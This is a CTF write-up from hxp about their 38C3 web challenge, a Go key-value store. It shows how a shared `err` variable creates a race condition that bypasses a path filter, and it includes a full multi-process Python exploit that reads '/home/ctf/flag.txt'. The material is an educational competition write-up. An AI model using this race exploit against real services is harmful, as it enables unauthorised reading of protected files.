---
title: "Fajny Jagazyn Wartości Kluczy - hxp 38C3 CTF"
category: "web"
subcategory: "race"
type: "writeup"
tags: ["web", "race-condition", "fajny", "jagazyn", "warto", "kluczy", "race", "hxp-38c3-ctf", "ctf-writeup"]
summary: "Sun, 29 December 2024 ~ 0xbb"
source:
  name: "CTFtime writeup #39730"
  url: "https://ctftime.org/writeup/39730"
original_source: "https://hxp.io/blog/114/hxp-38C3-CTF-Fajny-Jagazyn-Wartoci-Kluczy/"
ctf:
  name: "hxp 38C3 CTF"
  challenge: "Fajny Jagazyn Wartości Kluczy"
---

## Metadata

- **CTF:** hxp 38C3 CTF
- **Task:** Fajny Jagazyn Wartości Kluczy
- **Author team:** hxp
- **CTFtime:** <https://ctftime.org/writeup/39730>
- **Original writeup:** <https://hxp.io/blog/114/hxp-38C3-CTF-Fajny-Jagazyn-Wartoci-Kluczy/>

---
Sun, 29 December 2024 ~ 0xbb

## hxp 38C3 CTF: Fajny Jagazyn Wartości Kluczy

WEB (556 points, 9 solves)

Here we explain the intendet solution for the web challenge [Fajny Jagazyn Wartości Kluczy](https://2024.ctf.link/internal/challenge/fb03748d-7e94-4ca2-8998-a5e0ffcbd761/) from our recent CTF.

The challenge is about exploiting a race condition in Go.

### Description

We are given “A fresh web scale Key Value Store just for you 🥰”.

### How to solve

The challenge is a frontend and a key-value store implemented in Go. The frontend is not relevant for the challenge and only used to seperate key-value instances from each other.

Relevant kv.go code parts:

```
    ...
    func checkPath(path string) error {
    	if strings.Contains(path, ".") {
    		return fmt.Errorf("🛑 nielegalne (hacking)")
    	}
    
    	if strings.Contains(path, "flag") {
    		return fmt.Errorf("🛑 nielegalne (just to be sure)")
    	}
    
    	return nil
    }
    
    func main() {
    	time.AfterFunc(180*time.Second, func() {
    		os.Exit(0)
    	})
    
    	session, ok := os.LookupEnv("SESSION")
    	if !ok {
    		panic("SESSION env not set")
    	}
    
    	dataDir := "/tmp/kv." + session
    	err := os.Mkdir(dataDir, 0o777)
    	if err != nil {
    		panic(err)
    	}
    	err = os.Chdir(dataDir)
    	if err != nil {
    		panic(err)
    	}
    
    	http.HandleFunc("/get", func(w http.ResponseWriter, r *http.Request) {
    		name := r.URL.Query().Get("name")
    		if err = checkPath(name); err != nil {
    			http.Error(w, "checkPath :(", http.StatusInternalServerError)
    			return
    		}
    
    		file, err := os.Open(name)
    		if err != nil {
    			http.Error(w, "Open :(", http.StatusInternalServerError)
    			return
    		}
    
    		data, err := io.ReadAll(io.LimitReader(file, 1024))
    		if err != nil {
    			http.Error(w, "ReadAll :(", http.StatusInternalServerError)
    			return
    		}
    
    		w.Write(data)
    	})
    ...
```

The vulnerable code path:

```
    name := r.URL.Query().Get("name")
    if err = checkPath(name); err != nil { // err = should be err := otherwise previously defined err variable will be used
        http.Error(w, "checkPath :(", http.StatusInternalServerError)
        return
    }
```

`err` is shared between handler calls and therefore, we can race the `checkPath` call and the `err != nil` check.

Full exploit:

```
    #!/usr/bin/env python3
    
    import requests
    import sys, time
    import secrets
    from multiprocessing import Process, Queue
    
    URL = f'http://{sys.argv[1]}:{sys.argv[2]}'
    
    r = requests.get(URL)
    session_id = r.cookies['session']
    print('[+] session_id', session_id)
    
    time.sleep(1)
    
    queue = Queue()
    
    def worker(session_id, path,queue):
        sess = requests.Session()
        sess.cookies.set('session', session_id)
    
        while True:
            r = sess.get(f"{URL}/get", params={'name': path})
            if 'flag' in path and 'hxp{' in r.text:
                queue.put(r.text)
    
    processes = []
    for _ in range(8):
        p = Process(target=worker, args=(session_id, 'A', queue))
        processes.append(p)
        p.start()
    
    for _ in range(8):
        p = Process(target=worker, args=(session_id, '/home/ctf/flag.txt',queue))
        processes.append(p)
        p.start()
    
    flag = queue.get()
    print(flag)
    
    for p in processes:
        p.kill()
```
